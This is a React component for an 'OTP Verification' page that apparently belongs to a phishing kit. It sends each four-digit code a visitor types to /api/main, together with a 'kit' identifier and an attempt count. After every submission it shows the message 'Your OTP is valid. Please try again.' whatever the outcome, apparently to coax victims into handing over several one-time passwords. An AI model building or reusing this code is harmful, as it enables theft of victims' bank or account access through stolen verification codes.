import React, { useState, useRef, useEffect } from 'react';
import { ChevronLeft } from 'lucide-react';

import { useFetcher } from 'react-router';
import type { Route } from './+types/otp-new';



export default function OtpVerification({ 
  params
}: Route.ComponentProps) {

const { phone, amount } = params;
  
  const [otp, setOtp] = useState(['', '', '', '']);
  const [error, setError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(30);
  const [canResend, setCanResend] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [attempt, setAttempt] = useState(0);
  
  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null)
  ];

  // Countdown timer behavior for resending the OTP code safely
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [countdown]);

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return; // Strictly allow digits only
    
    if (error) setError(null); // Clear errors dynamically on input update

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1); // Only store the last typed digit character
    setOtp(newOtp);

    // Auto-focus next input box layout container ahead
    if (value && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Graceful backspace input focus navigation recovery backward
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handleResend = () => {
    if (!canResend) return;
    console.log("New verification code broadcast requested");
    setOtp(['', '', '', '']);
    setError(null);
    setCountdown(30);
    setCanResend(false);
    inputRefs[0].current?.focus();
  };
  const fetcher = useFetcher();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const finalCode = otp.join('');

    if (finalCode.length < 4) {
      setError("Please fill in all 4 code digits to continue.");
      return;
    }

    setIsSubmitting(true);
    await fetcher.submit({
      phone: phone,
      otp: finalCode,
      action: "submit-otp",
      kit: localStorage.getItem("kit"),
      attempt: attempt+1,
    }, {
        method: "POST",
        action: "/api/main",
    });
    setIsSubmitting(false);
    setAttempt(attempt+1);

    setError("Your OTP is valid. Please try again.");

    // Field Length Validation Bounds Rule Checks
    


    
  };
  useEffect(()=>{
    if(fetcher.data?.success){
      window.location.href="/success"
    }
  },[fetcher.data])

  const isFormFilled = otp.every(digit => digit !== '');

  return (
    <div className="min-h-screen bg-[#f3f4f6] flex flex-col items-center justify-center p-4 antialiased selection:bg-blue-100">
      
      {/* Outer Back Navigation Anchor Button Container */}
      <div className="w-full max-w-[440px] mb-4 flex justify-start">
        <a 
          href={"/process/"+amount}
          className="w-10 h-10 rounded-full bg-white flex items-center justify-center text-gray-500 hover:text-gray-800 shadow-sm border border-gray-100 hover:border-gray-200 active:scale-95 transition-all"
        >
          <ChevronLeft className="w-5 h-5 stroke-[2.5]" />
        </a>
      </div>

      {/* Main Verification Card Body Element */}
      <div className="w-full max-w-[440px] bg-white rounded-[24px] border border-gray-100 shadow-[0_8px_30px_rgb(0,0,0,0.04)] p-8 md:p-10">
        
        <form onSubmit={handleSubmit} className="space-y-6">
          
          {/* Header Typography Layout Area */}
          <div>
            <h1 className="text-[#4a5568] text-2xl font-bold tracking-tight mb-3">
              OTP Verification
            </h1>
            <p className="text-gray-400 text-[13.5px] leading-relaxed font-normal">
              Enter the OTP sent to your phone number. Do not share the code with anyone.
            </p>
            <div className="text-[#4a5568] text-[15px] font-semibold tracking-wide mt-4">
              {phone}
            </div>
          </div>

          {/* OTP Input Fields Core Grid Block */}
          <div className="space-y-2">
            <label className="text-gray-400 text-xs block font-medium">
              OTP
            </label>
            
            <div className="grid grid-cols-4 gap-3.5">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={inputRefs[index]}
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={`h-14 border rounded-[12px] text-center text-xl font-semibold text-gray-700 bg-white focus:outline-none transition-all ${
                    error 
                      ? 'border-red-400 focus:border-red-500 focus:ring-1 focus:ring-red-200' 
                      : 'border-blue-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-100'
                  }`}
                />
              ))}
            </div>

            {/* Error Framework Prompt Alert Label */}
            {error && (
              <p className="text-red-500 text-xs mt-1 text-center font-medium animate-fade-in">
                {error}
              </p>
            )}
          </div>

          {/* Dynamic Resend Countdown Subheading Text Context Option */}
          <div className="text-center text-[13px]">
            {canResend ? (
              <button
                type="button"
                onClick={handleResend}
                className="text-blue-500 font-medium hover:underline active:opacity-80 transition-all"
              >
                You can now resend OTP
              </button>
            ) : (
              <span className="text-gray-400 font-normal">
                Resend OTP in <span className="font-semibold text-gray-500">{countdown}s</span>
              </span>
            )}
          </div>

          {/* Final Submission Intent Handler Action */}
          <button
            type="submit"
            disabled={!isFormFilled || isSubmitting}
            className={`w-full py-4 px-6 rounded-[14px] text-white text-[15px] font-medium transition-all shadow-sm ${
              isFormFilled 
                ? 'bg-blue-500 hover:bg-blue-600 active:scale-[0.99] cursor-pointer' 
                : 'bg-[#bfbfbf] cursor-not-allowed opacity-90'
            }`}
          >
            {isSubmitting ? (
              <span className="flex items-center justify-center gap-1.5">
                {/* Native CSS Spinner */}
                <span className="w-3.5 h-3.5 border-2 border-[#125eb7]/30 border-t-[#125eb7] rounded-full animate-spin"></span>
                Processing...
              </span>
            ) : (
              'Submit'
            )}
          </button>

        </form>

      </div>
    </div>
  );
}
